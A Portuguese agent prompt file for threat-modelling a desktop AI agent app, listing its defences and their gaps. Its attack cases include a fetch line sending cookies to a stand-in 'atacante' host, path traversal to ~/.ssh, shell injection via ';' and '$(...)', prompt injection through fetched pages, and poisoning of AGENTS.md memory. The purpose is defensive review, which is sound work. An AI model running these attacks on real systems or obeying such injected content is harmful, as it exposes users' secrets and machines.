---
description: "Modelagem de ameaças sobre o fluxo real de dados do app (webview → IPC → core → tools → Docker/internet), com as defesas que já existem"
name: "threat-model"
argument-hint: "fronteira ou feature a atacar (vazio = fluxo completo do turno do agente)"
agent: "agent"
---

Atue como engenheiro de segurança ofensivo. Não redesenhe o app: ache onde a defesa
**existe mas não alcança**, e diga o menor passo que fecha a brecha.

## Superfície real (não genérica)

```
arquivo do usuário / página web / resposta do modelo   ← entrada não confiável
        ↓
variants/desktop (React)      ── IPC ──►  src-tauri (Rust)
        │                                  │ worker.rs: fila, uma sessão
        │                                  ↓
        └── iframe sandbox          common/ (core MCP sobre stdio)
                                           ↓
                          read_file/edit_file/write_file · list_directory
                          run_command → DockerSandbox ou LocalRunner (opt-in)
                          web_fetch/web_search (opt-in) → internet
                          ask_agent → modelo (HTTP, local ou remoto)
```

## Defesas que existem — verifique o alcance, não a intenção

| Defesa | Onde | O que **não** cobre |
| --- | --- | --- |
| Pré-visualização em iframe `sandbox="allow-scripts"` **sem** `allow-same-origin` | `PreviewPanel.tsx` | a página ainda executa script e pode fazer `fetch`; `window.open`, popups |
| Web desligada até `NEXUS_WEB_ACCESS=1` | `webTools.ts` | quem define a variável: um modelo não muda, mas um `run_command` muda? |
| Política de SSRF: nome/faixa/DNS/redirect | `common/web/fetchPolicy.ts` | **DNS rebinding** (documentado no módulo) |
| `--cap-drop ALL`, `--user uid:gid`, sem `--privileged` | `common/docker/` | bind mount do workspace é leitura/escrita por definição |
| `NEXUS_UNSANDBOXED` explícito | `common/index.ts` | é um opt-out: uma vez ligado, nada avisa de novo |
| Confinamento de caminho (`resolveWorkspacePath`) | `common/security/pathGuard.ts` | usa `normalize`/`resolve` **lexical**, sem `realpath`: symlink dentro do workspace apontando para fora passa |

## Método

Para cada fronteira: **entrada controlada por quem → o que ela alcança → o que
para → o que sobra**. Depois tente a sequência de ataque mais curta que produz dano
real (apagar arquivo, exfiltrar, executar comando, escapar do workspace).

Casos que valem o esforço (verifique no código, não no doc):

- Um arquivo `.html` aberto na pré-visualização, escrito por um modelo, contendo
  `fetch('https://atacante/?d='+document.cookie)` — o que limita? (origem única.)
- `edit_file`/`read_file` com caminho `../../` ou symlink para `~/.ssh`.
- `run_command` com `;` e `$(...)` no `LocalRunner` vs `DockerSandbox`: quem escapa o quê.
- Conteúdo de página web voltando pelo `web_fetch` e entrando no prompt do agente
  (injeção de prompt que pede `run_command`).
- `remember_project_fact` gravando texto vindo do modelo dentro de `AGENTS.md`, que é
  lido por sessões futuras.
- Segredo em `console.error`/log do core ou em mensagem de erro devolvida à UI.

## Entrega

| # | Fronteira | Ataque (sequência) | Alcança | Defesa atual | Sobra | Gravidade |
| --- | --- | --- | --- | --- | --- | --- |

Depois, os **3** de maior valor: o passo mínimo que fecha, o teste que prova que
fechou, e o custo (o que deixa de funcionar). Termine com o que você **não** avaliou
— dependências de terceiros, binários nativos, a cadeia do modelo local — sem
insinuar cobertura que não houve.
